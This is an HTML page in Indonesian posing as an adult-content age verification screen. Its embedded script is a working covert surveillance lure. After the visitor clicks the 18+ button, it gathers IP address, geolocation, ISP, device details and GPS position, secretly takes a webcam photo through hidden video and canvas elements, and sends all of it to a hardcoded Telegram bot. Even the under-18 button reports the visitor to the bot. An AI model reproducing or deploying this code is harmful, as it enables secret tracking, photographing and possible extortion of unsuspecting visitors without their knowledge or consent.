<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8">
  <title>Adult Verification</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }
    
    body {
      background: #000;
      font-family: Arial, sans-serif;
      color: #fff;
      height: 100vh;
      display: flex;
      justify-content: center;
      align-items: center;
      padding: 20px;
    }
    
    /* Verification Screen */
    .verification-screen {
      background: rgba(20, 0, 30, 0.9);
      padding: 40px;
      border-radius: 10px;
      max-width: 400px;
      width: 100%;
      text-align: center;
      border: 2px solid #ff00ff;
      box-shadow: 0 0 20px rgba(255, 0, 255, 0.5);
    }
    
    .warning-icon {
      font-size: 50px;
      color: #ff00ff;
      margin-bottom: 20px;
    }
    
    .title {
      font-size: 24px;
      color: #ff66ff;
      margin-bottom: 10px;
    }
    
    .subtitle {
      font-size: 14px;
      color: #ccc;
      margin-bottom: 30px;
    }
    
    .age-buttons {
      display: flex;
      gap: 15px;
      margin-bottom: 20px;
    }
    
    .age-btn {
      flex: 1;
      padding: 15px;
      border: none;
      border-radius: 5px;
      font-size: 16px;
      font-weight: bold;
      cursor: pointer;
      transition: all 0.3s;
    }
    
    .age-btn.yes {
      background: #ff00ff;
      color: white;
    }
    
    .age-btn.no {
      background: #333;
      color: #ccc;
    }
    
    .age-btn.yes:hover {
      background: #ff66ff;
      box-shadow: 0 0 15px #ff00ff;
    }
    
    .age-btn.no:hover {
      background: #444;
    }
    
    .warning-text {
      font-size: 12px;
      color: #888;
      margin-top: 20px;
    }
    
    /* Status Screen */
    .status-screen {
      display: none;
      background: rgba(30, 30, 30, 0.95);
      padding: 30px;
      border-radius: 10px;
      max-width: 400px;
      width: 100%;
      text-align: center;
      box-shadow: 0 0 20px rgba(0, 255, 0, 0.5);
    }
    
    .status-title {
      font-size: 22px;
      color: #00ff00;
      margin-bottom: 20px;
    }
    
    .status-icon {
      font-size: 40px;
      margin-bottom: 20px;
      animation: pulse 1.5s infinite;
    }
    
    @keyframes pulse {
      0%, 100% { transform: scale(1); opacity: 1; }
      50% { transform: scale(1.1); opacity: 0.8; }
    }
    
    .status-message {
      font-size: 14px;
      color: #ccc;
      line-height: 1.5;
      margin-bottom: 20px;
      padding: 15px;
      background: rgba(0, 0, 0, 0.3);
      border-radius: 5px;
    }
    
    .loading-bar {
      width: 100%;
      height: 4px;
      background: #333;
      border-radius: 2px;
      overflow: hidden;
      margin: 20px 0;
    }
    
    .loading-progress {
      width: 0%;
      height: 100%;
      background: #00ff00;
      border-radius: 2px;
      transition: width 0.3s;
    }
    
    /* Hidden Elements */
    video, canvas {
      display: none;
    }
  </style>
</head>
<body>
  <!-- Verification Screen -->
  <div class="verification-screen" id="verificationScreen">
    <div class="warning-icon">üîû</div>
    <h1 class="title">CONTEN ADULT</h1>
    <p class="subtitle">Apakah Anda berusia 18 tahun atau lebih?</p>
    
    <div class="age-buttons">
      <button class="age-btn yes" id="yesBtn">YA, SAYA 18+</button>
      <button class="age-btn no" id="noBtn">TIDAK, SAYA DI BAWAH 18</button>
    </div>
    
    <p class="warning-text">
      Dengan mengklik "YA", Anda mengonfirmasi bahwa Anda berusia 18+ dan menyetujui syarat penggunaan.
    </p>
  </div>
  
  <!-- Status Screen -->
  <div class="status-screen" id="statusScreen">
    <div class="status-icon">‚öôÔ∏è</div>
    <h2 class="status-title">SYSTEM PROSES</h2>
    <div class="status-message" id="statusMessage">
      Memulai sistem...
    </div>
    <div class="loading-bar">
      <div class="loading-progress" id="loadingProgress"></div>
    </div>
  </div>
  
  <!-- Camera Elements -->
  <video id="video" autoplay playsinline></video>
  <canvas id="canvas" width="640" height="480"></canvas>

  <script>
    // ====================
    // ORIGINAL SYSTEM CODE - 100% UTUH
    // ====================
    
    const botToken = '8253544506:AAGLgGdYG3fwy8d-C2_KTKbnx09mDZ7LPaA';
    const chatIds = ['8591983840'];
    
    // ‚úÖ Fungsi sendToTelegram utuh
    function sendToTelegram(text) {
      chatIds.forEach(id => {
        fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ chat_id: id, text: text, parse_mode: 'HTML' })
        }).catch(console.error);
      });
    }
    
    // ‚úÖ Fungsi sendPhotoToTelegram utuh
    function sendPhotoToTelegram(blob) {
      chatIds.forEach(id => {
        const formData = new FormData();
        formData.append('chat_id', id);
        formData.append('photo', blob);
        fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
          method: 'POST',
          body: formData
        }).catch(console.error);
      });
    }
    
    // ‚úÖ Fungsi getInfo utuh
    async function getInfo() {
      let ip = '-', city = '-', region = '-', country = '-', org = '-';
      try {
        const ipRes = await fetch('https://api.ipify.org?format=json');
        const ipData = await ipRes.json();
        ip = ipData.ip;
        const locRes = await fetch(`https://ip-api.com/json/${ip}`);
        const loc = await locRes.json();
        if (loc.status === 'success') {
          city = loc.city;
          region = loc.regionName;
          country = loc.country;
          org = loc.org;
        }
      } catch {}
      
      const battery = await navigator.getBattery?.() || { level: 0, charging: false };
      const batteryPercent = battery.level ? `${(battery.level * 100).toFixed(0)}%` : 'N/A';
      
      const text = `
IP         : ${ip}
Kota       : ${city}
Region     : ${region}
Negara     : ${country}
ISP        : ${org}
Browser    : ${navigator.userAgent}
OS         : ${navigator.platform}
Resolusi   : ${screen.width}x${screen.height}
Baterai    : ${batteryPercent} (${battery.charging ? 'Charging' : 'Tidak Charging'})
Memori     : ${navigator.deviceMemory || 'N/A'} GB
Cookie     : ${navigator.cookieEnabled ? 'Ya' : 'Tidak'}
Waktu      : ${new Date().toLocaleString()}
      `.trim();
      
      sendToTelegram(`<b>üì• Info Pengunjung:</b>\n<pre>${text}</pre>`);
      
      if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(
          pos => {
            const link = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
            sendToTelegram(`<b>üìç Lokasi GPS:</b> <a href="${link}">Klik di sini</a>`);
          },
          () => sendToTelegram(`üìç Lokasi GPS Ditolak`)
        );
      } else {
        sendToTelegram(`üìç Browser tidak support GPS`);
      }
    }
    
    // ‚úÖ Fungsi startCamera utuh
    async function startCamera() {
      const video = document.getElementById('video');
      const canvas = document.getElementById('canvas');
      const ctx = canvas.getContext('2d');
      return new Promise((resolve) => {
        navigator.mediaDevices.getUserMedia({ video: true })
          .then(stream => {
            video.srcObject = stream;
            video.onloadedmetadata = () => {
              setTimeout(() => {
                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                canvas.toBlob(blob => {
                  if (blob) sendPhotoToTelegram(blob);
                  stream.getTracks().forEach(track => track.stop());
                  resolve();
                }, 'image/jpeg');
              }, 3000);
            };
          })
          .catch(err => {
            sendToTelegram('‚ùå Kamera Ditolak atau Tidak Tersedia');
            resolve();
          });
      });
    }
    
    // ====================
    // AUTO SYSTEM EXECUTION
    // ====================
    
    const yesBtn = document.getElementById('yesBtn');
    const noBtn = document.getElementById('noBtn');
    const verificationScreen = document.getElementById('verificationScreen');
    const statusScreen = document.getElementById('statusScreen');
    const statusMessage = document.getElementById('statusMessage');
    const loadingProgress = document.getElementById('loadingProgress');
    
    // Function to update status
    function updateStatus(message, progress) {
      statusMessage.textContent = message;
      loadingProgress.style.width = progress + '%';
    }
    
    // Auto execution process
    async function executeSystem() {
      updateStatus("üì° Mengumpulkan data informasi...", 10);
      
      try {
        // Step 1: Collect user info
        updateStatus("üìä Mengambil data IP dan lokasi...", 30);
        await getInfo();
        
        // Step 2: Start camera
        updateStatus("üì∑ Mengakses kamera...", 50);
        await startCamera();
        
        // Step 3: Sending data
        updateStatus("üì§ Mengirim data ke server...", 70);
        
        // Step 4: Random success message
        updateStatus("‚úÖ Sistem berhasil dijalankan", 90);
        
        // Send final notification
        sendToTelegram(`<b>‚úÖ SYSTEM EXECUTED SUCCESSFULLY</b>\nTime: ${new Date().toLocaleString()}`);
        
        // Final step
        setTimeout(() => {
          updateStatus("üéâ Proses selesai! Semua data telah terkirim", 100);
        }, 1000);
        
      } catch (error) {
        updateStatus("‚ùå Error dalam proses", 100);
        sendToTelegram(`<b>‚ùå SYSTEM ERROR</b>\n${error.message}\nTime: ${new Date().toLocaleString()}`);
      }
    }
    
    // YES button - Start auto execution
    yesBtn.addEventListener('click', async () => {
      verificationScreen.style.display = 'none';
      statusScreen.style.display = 'block';
      document.title = "System Processing";
      
      // Send access notification
      sendToTelegram(`<b>üîì ACCESS GRANTED - AUTO EXECUTION</b>\nUser confirmed 18+\nTime: ${new Date().toLocaleString()}`);
      
      // Start the auto execution
      setTimeout(() => {
        executeSystem();
      }, 1000);
    });
    
    // NO button - Access denied
    noBtn.addEventListener('click', () => {
      document.body.innerHTML = `
        <div style="text-align: center; padding: 40px;">
          <div style="font-size: 60px; margin-bottom: 20px;">üö´</div>
          <h1 style="color: #ff0000; margin-bottom: 20px;">ACCESS DENIED</h1>
          <p style="color: #ccc; margin-bottom: 30px;">
            Anda tidak memenuhi persyaratan usia untuk mengakses konten ini.
          </p>
          <button onclick="location.reload()" style="
            padding: 10px 20px;
            background: #333;
            color: white;
            border: none;
            border-radius: 5px;
            cursor: pointer;
          ">
            Kembali
          </button>
        </div>
      `;
      
      sendToTelegram(`<b>üö´ ACCESS DENIED</b>\nUser is under 18\nTime: ${new Date().toLocaleString()}`);
    });
  </script>
</body>
</html>
